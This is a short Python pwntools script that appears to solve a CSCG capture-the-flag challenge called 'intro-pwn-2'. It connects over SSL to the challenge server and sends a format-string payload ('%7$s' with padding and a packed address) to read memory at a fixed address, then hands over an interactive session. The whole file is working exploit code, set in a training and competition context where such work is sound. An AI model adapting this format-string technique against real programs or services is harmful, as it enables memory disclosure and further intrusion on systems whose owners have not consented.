from pwn import *

#p = process("/home/root/ctf/cscg/pwn_2/intro-pwn-2/pwn2")

#ncat --ssl 621669b58d72895209bb90e2-intro-pwn-2.challenge.master.cscg.live 31337
p = remote("621669b58d72895209bb90e2-intro-pwn-2.challenge.master.cscg.live", 31337, ssl=True)

#payload = b'AAAAAAAA'
payload = b'%7$s'
payload += b'\x00\x00\x00\x00'
payload += p64(0x4040e0)

p.recvuntil("Give me some buffer: \n")
p.sendline(payload)

p.interactive()